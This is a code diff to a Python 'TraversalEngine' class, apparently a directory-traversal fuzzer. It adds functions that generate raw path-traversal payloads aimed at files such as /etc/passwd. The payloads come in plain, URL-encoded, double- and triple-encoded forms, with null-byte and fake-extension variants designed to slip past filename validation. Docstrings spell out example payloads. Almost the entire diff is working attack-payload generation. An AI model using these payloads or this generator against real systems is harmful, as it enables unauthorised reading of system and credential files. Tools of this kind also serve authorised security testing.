@@ -556,7 +556,9 @@ class TraversalEngine:
                 
                 # Create payloads for all file variants
                 for file_variant in file_variants:
-                    payload = traversal + file_variant
+                    # Normalize target file to prevent double slashes/backslashes
+                    normalized_target = self._normalize_target_file_for_traversal(file_variant, traversal)
+                    payload = traversal + normalized_target
                     
                     # Add extension if specified
                     if extension:
@@ -576,6 +578,19 @@ class TraversalEngine:
             
             if not self.quiet:
                 print(f"[+] Added {len(null_byte_patterns)} null byte bypass patterns")
+
+        # Add basic standalone traversal patterns (without prefixes)
+        if not bisection_depth:  # Skip in bisection mode for efficiency
+            if not self.quiet:
+                print("[+] Creating Basic Standalone Traversal patterns")
+                
+            basic_standalone_patterns = self._generate_basic_standalone_patterns(
+                os_type, depth, specific_file, extra_files, extension
+            )
+            final_traversals.extend(basic_standalone_patterns)
+            
+            if not self.quiet:
+                print(f"[+] Added {len(basic_standalone_patterns)} basic standalone patterns")
 
         # Add direct absolute path injection patterns
         if include_absolute and not bisection_depth:  # Skip absolute paths in bisection mode
@@ -912,6 +927,172 @@ class TraversalEngine:
         
         return unique_patterns
 
+    def _generate_basic_standalone_patterns(
+        self,
+        os_type: OSType,
+        depth: int,
+        specific_file: Optional[str],
+        extra_files: bool,
+        extension: Optional[str]
+    ) -> List[str]:
+        """
+        Generate basic standalone traversal patterns without prefixes
+        
+        These are core directory traversal patterns that should be available as raw payloads:
+        - ../../../etc/passwd
+        - ../../../etc/passwd%00.png  
+        - ..%252f..%252f..%252fetc/passwd
+        - etc.
+        
+        Args:
+            os_type: Operating system type for intelligent fuzzing
+            depth: Maximum depth for traversal patterns  
+            specific_file: Specific filename to target
+            extra_files: Include extra files from EXTRA_FILES
+            extension: File extension that may be validated
+            
+        Returns:
+            List of basic standalone traversal patterns
+        """
+        patterns = []
+        
+        # Get target files
+        target_files = self._get_target_files(os_type, specific_file, extra_files)
+        
+        # Basic traversal sequences for different depths
+        basic_sequences = []
+        for d in range(1, depth + 1):
+            basic_sequences.extend([
+                '../' * d,          # Standard forward slash
+                '..\\'  * d,        # Standard backslash  
+                '%2e%2e%2f' * d,    # URL encoded
+                '%2e%2e%5c' * d,    # URL encoded backslash
+                '%252e%252e%252f' * d,  # Double URL encoded
+                '%252e%252e%255c' * d,  # Double URL encoded backslash
+            ])
+        
+        # Add comprehensive URL encoding variations
+        for d in range(1, min(depth + 1, 4)):  # Limit depth to prevent explosion
+            basic_sequences.extend([
+                f"..%252f" * d,     # Double encoded slash pattern (without trailing slash)
+                f"..%255c" * d,     # Double encoded backslash pattern (without trailing slash)  
+                f"..%25252f" * d,   # Triple encoded slash pattern (without trailing slash)
+                f"..%25255c" * d,   # Triple encoded backslash pattern (without trailing slash)
+            ])
+        
+        # Generate basic patterns: sequence + target_file
+        for sequence in basic_sequences:
+            for target_file in target_files:
+                # For basic standalone patterns, generate both normalized and original target versions
+                # This ensures we get patterns like both:
+                # - ..%252f..%252f..%252f/etc/passwd (original target)
+                # - ..%252f..%252f..%252fetc/passwd (normalized target)
+                
+                # Version 1: Use original target file (keeps leading separators)
+                pattern1 = sequence + target_file
+                if extension:
+                    pattern1 += extension
+                patterns.append(pattern1)
+                
+                # Version 2: Use normalized target file (removes leading separators)
+                normalized_target = target_file.lstrip('/').lstrip('\\')
+                if normalized_target != target_file:  # Only add if different
+                    pattern2 = sequence + normalized_target
+                    if extension:
+                        pattern2 += extension
+                    patterns.append(pattern2)
+                else:
+                    # Use the normalization function for complex cases
+                    normalized_target = self._normalize_target_file_for_traversal(target_file, sequence)
+                    pattern2 = sequence + normalized_target
+                    if extension:
+                        pattern2 += extension
+                    if pattern2 != pattern1:  # Only add if different
+                        patterns.append(pattern2)
+                
+                # Add null byte bypass variations for each basic pattern
+                null_patterns1 = self._generate_null_byte_variations_for_basic_pattern(
+                    sequence, target_file, extension
+                )
+                patterns.extend(null_patterns1)
+                
+                if normalized_target != target_file:
+                    null_patterns2 = self._generate_null_byte_variations_for_basic_pattern(
+                        sequence, normalized_target, extension
+                    )
+                    patterns.extend(null_patterns2)
+        
+        # Remove duplicates while preserving order
+        unique_patterns = []
+        seen = set()
+        for pattern in patterns:
+            if pattern not in seen and len(pattern) > 5:  # Filter out too short patterns
+                unique_patterns.append(pattern)
+                seen.add(pattern)
+        
+        return unique_patterns
+
+    def _generate_null_byte_variations_for_basic_pattern(
+        self,
+        sequence: str,
+        target_file: str,
+        extension: Optional[str]
+    ) -> List[str]:
+        """
+        Generate null byte bypass variations for basic traversal patterns
+        
+        These create patterns like:
+        - ../../../etc/passwd%00.png
+        - ../../../etc/passwd%2500.jpg
+        - etc.
+        
+        Args:
+            sequence: Traversal sequence (e.g., "../../../")
+            target_file: Target file (e.g., "etc/passwd")
+            extension: Optional extension override
+            
+        Returns:
+            List of null byte bypass variations
+        """
+        variations = []
+        
+        # Common null byte encodings
+        null_encodings = [
+            '%00',           # Standard URL encoding
+            '%2500',         # Double URL encoding
+            '%252500',       # Triple URL encoding
+            '%c0%80',        # UTF-8 overlong encoding
+            '%u0000',        # Unicode encoding
+        ]
+        
+        # Common fake extensions for bypass
+        fake_extensions = [
+            '.png', '.jpg', '.jpeg', '.gif', '.pdf', '.txt', 
+            '.log', '.xml', '.json', '.doc', '.zip'
+        ]
+        
+        # If extension provided, prioritize it
+        if extension:
+            if not extension.startswith('.'):
+                extension = '.' + extension
+            test_extensions = [extension] + [ext for ext in fake_extensions if ext != extension]
+        else:
+            test_extensions = fake_extensions
+        
+        # Generate null byte bypass patterns
+        for null_enc in null_encodings:
+            for fake_ext in test_extensions[:6]:  # Limit to prevent explosion
+                # Pattern: sequence + target + null_byte + fake_extension
+                pattern = f"{sequence}{target_file}{null_enc}{fake_ext}"
+                variations.append(pattern)
+                
+                # Pattern with multiple extensions
+                multi_ext = fake_ext + '.backup'
+                pattern_multi = f"{sequence}{target_file}{null_enc}{multi_ext}"
+                variations.append(pattern_multi)
+        
+        return variations
+
     def _get_target_files(
         self, 
         os_type: OSType, 
@@ -964,6 +1145,58 @@ class TraversalEngine:
             adapted_file = adapted_file.replace("\\\\", "/")
 
         return adapted_file
+
+    def _normalize_target_file_for_traversal(self, target_file: str, traversal_pattern: str) -> str:
+        """
+        Normalize target file for traversal pattern combination to prevent double slashes
+        
+        This method ensures clean path combinations by removing leading separators from
+        target files when the traversal pattern already ends with a separator.
+        
+        Examples:
+        - traversal: "../../../" + target: "/etc/passwd" -> "etc/passwd" (remove leading /)
+        - traversal: "..%252f..%252f..%252f" + target: "/etc/passwd" -> "/etc/passwd" (keep as-is for encoded)
+        - traversal: "....//....//....//", target: "/etc/passwd" -> "etc/passwd" (remove leading /)
+        
+        Args:
+            target_file: Target file path
+            traversal_pattern: Traversal pattern that will be prepended
+            
+        Returns:
+            Normalized target file path
+        """
+        if not target_file:
+            return target_file
+            
+        # Check if traversal pattern ends with a path separator
+        pattern_ends_with_separator = (
+            traversal_pattern.endswith('/') or 
+            traversal_pattern.endswith('\\') or
+            traversal_pattern.endswith('//') or
+            traversal_pattern.endswith('\\\\')
+        )
+        
+        # Check if pattern contains URL-encoded separators at the end
+        pattern_lower = traversal_pattern.lower()
+        pattern_ends_with_encoded = (
+            pattern_lower.endswith('%2f') or
+            pattern_lower.endswith('%5c') or
+            pattern_lower.endswith('%252f') or
+            pattern_lower.endswith('%255c') or
+            pattern_lower.endswith('%25252f') or
+            pattern_lower.endswith('%25255c')
+        )
+        
+        # If pattern ends with separator and target starts with separator, remove leading separator from target
+        if pattern_ends_with_separator and (target_file.startswith('/') or target_file.startswith('\\')):
+            return target_file.lstrip('/').lstrip('\\')
+        
+        # For encoded patterns, keep target file as-is to maintain encoding integrity
+        if pattern_ends_with_encoded:
+            return target_file
+            
+        # Default: return target file as-is
+        return target_file
 
     def _generate_path_validation_bypass_patterns(
         self, 
